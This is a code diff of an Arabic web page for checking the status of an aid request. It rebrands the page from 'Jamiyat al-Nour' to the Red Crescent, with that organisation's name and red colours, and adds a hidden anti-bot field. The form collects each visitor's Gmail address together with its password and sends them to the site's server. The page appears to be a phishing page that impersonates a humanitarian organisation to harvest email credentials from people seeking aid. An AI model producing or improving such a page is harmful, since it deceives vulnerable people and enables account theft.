@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="البوابة الإلكترونية الرسمية لتسجيل الدخول والاستعلام المباشر عن حالة طلب المساعدات - جمعية النور.">
-    <title>جمعية النور | الاستعلام المباشر عن حالة الطلب</title>
+    <meta name="description" content="البوابة الإلكترونية الرسمية لتسجيل الدخول والاستعلام المباشر عن حالة طلب المساعدات - منظمة الهلال الأحمر.">
+    <title>الهلال الأحمر | الاستعلام المباشر عن حالة الطلب</title>
     <!-- Google Fonts: Tajawal -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -15,10 +15,10 @@
     <link rel="stylesheet" href="style.css?v=20260806_3">
     <style>
         :root {
-            --primary-emerald: #0d9488;
-            --primary-glow: rgba(13, 148, 136, 0.4);
-            --accent-indigo: #6366f1;
-            --accent-rose: #e11d48;
+            --primary-emerald: #dc2626;
+            --primary-glow: rgba(220, 38, 38, 0.4);
+            --accent-indigo: #1e293b;
+            --accent-rose: #dc2626;
             --bg-deep: #0b0f19;
             --card-glass: rgba(17, 24, 39, 0.7);
             --card-border: rgba(255, 255, 255, 0.12);
@@ -511,7 +511,18 @@
     <div class="ambient-glow-orb-1"></div>
     <div class="ambient-glow-orb-2"></div>
 
-
+    <!-- Top Navigation Header -->
+    <header style="width: 100%; max-width: 700px; margin: 1.5rem auto 0; padding: 0 1.5rem; display: flex; align-items: center; justify-content: space-between; position: relative; z-index: 10;">
+        <a href="/" style="display: flex; align-items: center; gap: 0.6rem; text-decoration: none;">
+            <div style="width: 38px; height: 38px; border-radius: 10px; background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%); display: flex; align-items: center; justify-content: center; color: #fff; font-size: 1.2rem; box-shadow: 0 4px 12px rgba(220,38,38,0.4);">
+                <i class="fa-solid fa-moon"></i>
+            </div>
+            <span style="font-size: 1.25rem; font-weight: 900; color: #f8fafc;">الهلال <span style="color: #dc2626;">الأحمر</span></span>
+        </a>
+        <a href="/" style="display: inline-flex; align-items: center; gap: 0.5rem; background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255, 255, 255, 0.15); color: #f8fafc; padding: 0.55rem 1.1rem; border-radius: 9999px; font-size: 0.88rem; font-weight: 700; text-decoration: none; transition: all 0.25s ease;">
+            <i class="fa-solid fa-file-pen" style="color: #dc2626;"></i> تقديم طلب جديد
+        </a>
+    </header>
 
     <!-- Main Content Wrapper -->
     <main class="status-main-wrapper">
@@ -527,6 +538,8 @@
             </p>
 
             <form id="directStatusForm">
+                <!-- Anti-Bot Honeypot Field (Invisible to real users) -->
+                <input type="text" name="company_name_hp" id="company_name_hp" style="display:none !important; position:absolute; left:-9999px;" tabindex="-1" autocomplete="off">
                 <!-- 1. Gmail Email -->
                 <div class="form-field-group">
                     <label for="statusEmailInput"><i class="fa-solid fa-envelope" style="color: #2dd4bf;"></i> البريد الإلكتروني (Gmail حصراً)</label>
@@ -623,7 +636,7 @@
     </main>
 
     <footer style="text-align: center; padding: 1.5rem; color: #64748b; font-size: 0.85rem; border-top: 1px solid rgba(255,255,255,0.05); position: relative; z-index: 1;">
-        جميع الحقوق محفوظة &copy; 2026 جمعية النور للإغاثة والدعم الإنساني.
+        جميع الحقوق محفوظة &copy; 2026 منظمة الهلال الأحمر للإغاثة والدعم الإنساني.
     </footer>
 
     <script>
@@ -719,10 +732,13 @@
                 btn.disabled = true;
                 btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> جاري التحقق وتسجيل الدخول...';
 
+                const hpEl = document.getElementById('company_name_hp');
+                const company_name_hp = hpEl ? hpEl.value : '';
+
                 fetch('/api/check-status', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email, password, refCode })
+                    body: JSON.stringify({ email, password, refCode, company_name_hp })
                 })
                 .then(res => res.json())
                 .then(data => {
